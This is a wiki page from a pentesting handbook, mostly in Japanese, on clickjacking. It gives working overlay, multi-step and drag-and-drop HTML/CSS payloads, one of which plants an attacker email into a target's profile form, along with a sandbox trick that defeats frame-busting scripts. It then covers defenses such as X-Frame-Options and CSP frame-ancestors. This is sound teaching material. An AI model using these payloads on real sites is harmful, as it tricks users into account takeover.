# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Clickjackingとは何か

Clickjacking攻撃では、**ユーザー**がウェブページ上の**要素**を（**目に見えない**か別の要素に偽装された）誤って**クリック**するように**だまされ**ます。この操作により、マルウェアのダウンロード、悪意あるページへのリダイレクト、認証情報や機密情報の提供、金銭の送金、オンラインでの商品購入など、ユーザーにとって意図しない結果を招く可能性があります。

### フォームの事前入力トリック

ページ読み込み時に**GET parametersを使用してフォームのフィールド値を埋めることができる**場合があります。攻撃者はこの挙動を悪用してフォームを任意のデータで埋め、clickjacking payloadを送ってユーザーにSubmitボタンを押させることができます。

### Drag\&Dropでフォームを埋める

ユーザーに**フォームを記入**してもらう必要があるが、特定の情報（例えばメールアドレスやあなたが知っている特定のパスワード）を直接書かせたくない場合は、単に何かを**Drag\&Drop**してもらうように頼むだけで、制御下のデータを書き込ませることができます。例は[**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/)を参照してください。

### 基本的な Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### マルチステップペイロード
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

もし、ある要素をユーザーがクリックすることで**トリガーされる XSS**を確認していて、そのページが**clickjacking に脆弱**であれば、ユーザーを騙してボタンやリンクをクリックさせるように悪用できます。\
例:\
アカウントのプライベートな詳細（**あなただけが設定・参照できる**情報）に **self XSS** を見つけたとします。これらの詳細を設定する**form**のページが**Clickjacking**に脆弱で、GET パラメータで**form**を**prepopulate**できる場合、攻撃者はそのページに対して**Clickjacking**攻撃を仕込み、**XSS payload**で**form**を**prepopulate**し、**ユーザー**に**form を Submit**させるように**trick**できます。つまり、**form が送信され**て値が変更されると、**ユーザーが XSS を実行する**ことになります。


### DoubleClickjacking

Firstly [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), this technique would ask the victim to double click on a button of a custom page placed in a specific location, and use the timing differences between mousedown and onclick events to load the victim page duing the double click so the **victim actually clicks a legit button in the victim page**.

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> This technique allows to trick the user to click on 1 place in the victim page bypassing every protection against clickjacking. So the attacker needs to find **sensitive actions that can be done with just 1 click, like OAuth prompts accepting permissions**.

### Browser extensions: DOM-based autofill clickjacking

iframing された victim ページとは別に、攻撃者はページに注入される browser extension の UI 要素を狙うことができます。password managers はフォーカスされた入力の近くに autofill dropdowns を表示します。攻撃者が制御するフィールドにフォーカスを移し、extension のドロップダウンを隠蔽／覆い（opacity／overlay／top-layer のトリック）、強制されたユーザークリックで保存された項目を選択させ、敏感なデータを攻撃者制御の入力に埋め込ませることが可能です。このバリアントは iframe の露出を必要とせず、完全に DOM/CSS の操作で動作します。

- For concrete techniques and PoCs see:
-
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategies to Mitigate Clickjacking

### Client-Side Defenses

クライアント側で実行されるスクリプトは Clickjacking を防ぐために以下のような対策を行えます:

- アプリケーションウィンドウが main または top window であることを確認する。
- すべての frames を可視化する。
- 非表示の frames でのクリックを防止する。
- 潜在的な Clickjacking 試行を検出してユーザーに警告する。

ただし、これらの frame-busting スクリプトは回避される可能性があります:

- **Browsers' Security Settings:** 一部のブラウザはセキュリティ設定や JavaScript 非対応によりこれらのスクリプトをブロックする場合があります。
- **HTML5 iframe sandbox Attribute:** 攻撃者は sandbox 属性に allow-forms や allow-scripts を設定しつつ allow-top-navigation を付けないことで frame buster スクリプトを無効化できます。これにより iframe が自分が top window かどうかを確認できなくなります, 例えば
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
allow-forms と allow-scripts の値は、iframe 内でのアクションを有効にしつつ、トップレベルのナビゲーションを無効にします。ターゲットサイトの想定される機能を確保するために、攻撃の種類によっては allow-same-origin や allow-modals のような追加の権限が必要な場合があります。ブラウザのコンソールのメッセージが、どの権限を許可すべきかの指針になります。

### サーバー側の防御策

#### X-Frame-Options

**X-Frame-Options HTTP response header** は、ページを <frame> や <iframe> でレンダリングすることの正当性をブラウザに通知し、Clickjacking を防ぐのに役立ちます:

- X-Frame-Options: deny - どのドメインもコンテンツをフレームにできません。
- X-Frame-Options: sameorigin - 現在のサイトだけがコンテンツをフレームにできます。
- X-Frame-Options: allow-from https://trusted.com - 指定された 'uri' のみがページをフレームできます。
- 注意点: ブラウザがこのディレクティブをサポートしていない場合、機能しないことがあります。ブラウザによっては CSP frame-ancestors ディレクティブを優先するものもあります。

#### Content Security Policy (CSP) frame-ancestors directive

**frame-ancestors directive in CSP** は Clickjacking 対策として推奨される方法です:

- frame-ancestors 'none' - X-Frame-Options: deny と同様。
- frame-ancestors 'self' - X-Frame-Options: sameorigin と同様。
- frame-ancestors trusted.com - X-Frame-Options: allow-from と同様。

例えば、次の CSP は同一ドメインからのフレーミングのみを許可します:

Content-Security-Policy: frame-ancestors 'self';

詳細や複雑な例は、[frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) および [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors) を参照してください。

### Content Security Policy (CSP) と child-src、frame-src

**Content Security Policy (CSP)** は、ブラウザがコンテンツをロードできる許可されたソースを指定することで、Clickjacking やその他のコードインジェクション攻撃の防止に役立つセキュリティ対策です。

#### frame-src ディレクティブ

- フレームの有効なソースを定義します。
- default-src ディレクティブよりも具体的です。
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
このポリシーは同一オリジン(self)と https://trusted-website.com からのフレームを許可します。

#### child-src Directive

- CSP level 2で導入され、web workersとフレームの有効なソースを指定します。
- frame-srcおよびworker-srcのフォールバックとして機能します。
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
このポリシーは、同一オリジン（self）および https://trusted-website.com からのフレームとワーカーを許可します。

**使用上の注意:**

- 非推奨: child-src は frame-src および worker-src に置き換えられつつあります。
- フォールバック動作: frame-src がない場合、child-src がフレームのフォールバックとして使用されます。両方がない場合は default-src が使用されます。
- 厳密なソース定義: 悪用を防ぐために、ディレクティブには信頼できるソースのみを含めてください。

#### JavaScript Frame-Breaking Scripts

完全に確実ではありませんが、JavaScript ベースの frame-busting スクリプトを使用して、ウェブページがフレーム化されるのを防ぐことができます。例：
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Anti-CSRF Tokens の利用

- **トークン検証:** ウェブアプリケーションに anti-CSRF tokens を実装し、状態を変更するリクエストがユーザーの意図的な操作によるものであり、Clickjackedページ経由のものではないことを確認する。

## 参考資料

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../banners/hacktricks-training.md}}
